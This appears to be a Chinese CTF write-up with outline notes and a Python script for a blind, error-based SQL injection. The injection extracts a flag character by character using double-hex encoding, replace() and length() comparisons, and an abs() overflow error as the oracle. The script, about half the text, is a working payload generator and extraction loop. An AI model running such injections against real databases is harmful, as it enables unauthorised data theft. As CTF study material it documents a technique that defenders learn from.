- # 思路
	- 大致思路：
		- 将flag转换成一个只有数字的字符串，然后猜测其的开头，就这样一个字符一个字符地猜测，直到猜出所有的字符
	- 细节：
		- 猜测一个字符串的开头
		  id:: 63f78c53-528a-4b9f-8b54-9e254a8c7636
			- 将猜测的开头从字符串中去掉，如果成功去除则其长度必然变化，检测其长度即可
		- 将数字转为只有阿拉伯数字的字符串
		  id:: 63f78ccb-b747-4493-b196-b40579fc15f9
			- 用符号`||`拼接两个数字即可转为字符串
		- 将任意字符串转为只有阿拉伯数字的字符串
		  id:: 63f78d57-1656-4440-acc0-67f28785b89a
			- 经过两次`hex`运算即可
		- 用后两个技巧配合第一个技巧即可猜测任意字符串的开头
		- 判断两个数字是否相等
			- `abs(case({})when({})then(1)else(0x8000000000000000)end)`
			- 如果相等则不会出错，否则必然出错
- # 脚本
	- ```python
	  def to_hex(s):
	      return "".join([hex(ord(c))[2:].upper() for c in s])
	  
	  known = "flag{"
	  while True:
	      for i in range(32, 128):
	          # 我们先猜测flag的开头是guess
	          guess = known + chr(i)
	          payload = "(select(flag)from(flag))"
	          # 然后我们将flag和guess转为一个只有阿拉伯数字的字符串
	          payload = "hex(hex({}))".format(payload)
	          guess = to_hex(to_hex(guess))
	          # 再然后我们将flag开头的guess替换为"00"
	          payload = "replace({},({}),0||0)".format(payload, "||".join(list(guess)))
	          # 如果替换成功，flag的长度应为如下所示
	          guess_length = 168 - len(guess) + 2
	          # 获取替换后flag的长度
	          payload = "length({})".format(payload)
	          # 判断长度是否真的等于我们猜测的长度，如果等于那么说明替换成功，也就是说我们猜测的是正确的
	          payload = "114514||abs(case({})when({})then(1)else(0x8000000000000000)end)".format(payload, guess_length)
	          # 提交
	          r = requests.post(url, data = {
	              "id": payload
	          })
	          time.sleep(0.2)
	          # 如果替换成功，则不会出错
	          if "error" not in r.text:
	              known += chr(i)
	              print(known)
	              break
	      else:
	          print("Done")
	          print(known)
	          break
	  ```